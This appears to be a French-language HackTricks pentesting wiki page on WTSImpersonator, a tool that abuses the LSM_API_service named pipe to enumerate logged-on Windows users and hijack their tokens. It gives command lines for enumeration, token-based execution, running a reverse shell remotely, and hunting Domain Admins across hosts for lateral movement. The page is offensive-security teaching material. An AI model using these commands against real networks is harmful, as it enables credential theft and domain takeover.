{{#include ../../banners/hacktricks-training.md}}

L'outil **WTS Impersonator** exploite le **"\\pipe\LSM_API_service"** RPC Named pipe pour énumérer discrètement les utilisateurs connectés et détourner leurs jetons, contournant les techniques traditionnelles d'imitation de jetons. Cette approche facilite des mouvements latéraux sans heurts au sein des réseaux. L'innovation derrière cette technique est attribuée à **Omri Baso, dont le travail est accessible sur [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Fonctionnalité Principale

L'outil fonctionne à travers une séquence d'appels API :
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Modules Clés et Utilisation

- **Énumération des Utilisateurs** : L'énumération des utilisateurs locaux et distants est possible avec l'outil, en utilisant des commandes pour chaque scénario :

- Localement :
```powershell
.\WTSImpersonator.exe -m enum
```
- À distance, en spécifiant une adresse IP ou un nom d'hôte :
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Exécution de Commandes** : Les modules `exec` et `exec-remote` nécessitent un contexte de **Service** pour fonctionner. L'exécution locale nécessite simplement l'exécutable WTSImpersonator et une commande :

- Exemple d'exécution de commande locale :
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe peut être utilisé pour obtenir un contexte de service :
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Exécution de Commandes à Distance** : Implique la création et l'installation d'un service à distance similaire à PsExec.exe, permettant l'exécution avec les permissions appropriées.

- Exemple d'exécution à distance :
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Module de Chasse aux Utilisateurs** : Cible des utilisateurs spécifiques sur plusieurs machines, exécutant du code sous leurs identifiants. Cela est particulièrement utile pour cibler les Domain Admins ayant des droits d'administrateur local sur plusieurs systèmes.
- Exemple d'utilisation :
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
